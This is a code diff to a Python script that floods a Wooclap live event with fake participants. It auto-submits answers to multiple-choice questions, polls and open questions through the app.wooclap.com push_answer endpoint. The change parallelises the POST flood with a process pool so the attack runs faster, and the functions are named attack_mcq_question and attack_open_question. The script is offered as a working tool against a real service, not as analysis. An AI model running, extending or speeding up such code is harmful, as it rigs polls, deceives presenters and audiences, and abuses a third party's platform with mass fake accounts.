@@ -30,7 +30,7 @@ def get_event_data(event_code, user_id):
 def add_users(users, n):
     return users + generate_users(n)
 
-def attack_mcq_question(question, users, questionType):
+def attack_mcq_question(question, users, questionType, workers):
     global id_last_user_answered
 
     if not question['_id'] in id_last_user_answered:
@@ -68,12 +68,13 @@ def attack_mcq_question(question, users, questionType):
 
     if id_last_user_answered[question['_id']] != 0:
         start=id_last_user_answered[question['_id']]
-
-    for i in range(start, end):
-        headers = get_wooclap_headers(users[i])
-        json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
-        requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
     
+    with concurrent.futures.ProcessPoolExecutor(max_workers=workers) as executor:
+        for i in range(start, end):
+            headers = get_wooclap_headers(users[i])
+            json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
+            executor.submit(requests.post, f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
+
     id_last_user_answered[question['_id']] = end
     
 
@@ -118,8 +119,8 @@ def attack_open_question(question, users):
 def post_url(url, headers):
     requests.post(url, headers=headers)
 
-def create_users(list_of_users, event_code):
-    workers = int(input("How many workers do you want ? "))
+def create_users(list_of_users, event_code, workers):
+    
     os.system('cls||clear')
     print("######################################")
     print("######### CREATING THE USERS #########")
@@ -135,8 +136,9 @@ list_of_users = generate_users(number_of_users)
 
 event_code = input("What is the event code of the Wooclap?\n> ")
 
+workers = int(input("How many workers do you want ? "))
 
-create_users(list_of_users, event_code)
+create_users(list_of_users, event_code, workers)
 
 while True:
     os.system('cls||clear')
@@ -192,6 +194,6 @@ while True:
         continue
 
     if question["__t"] == "MCQ" or question["__t"] == "Poll":
-        attack_mcq_question(question, list_of_users, question["__t"])
+        attack_mcq_question(question, list_of_users, question["__t"], workers)
     elif question["__t"] == "OpenQuestion":
         attack_open_question(question, list_of_users)
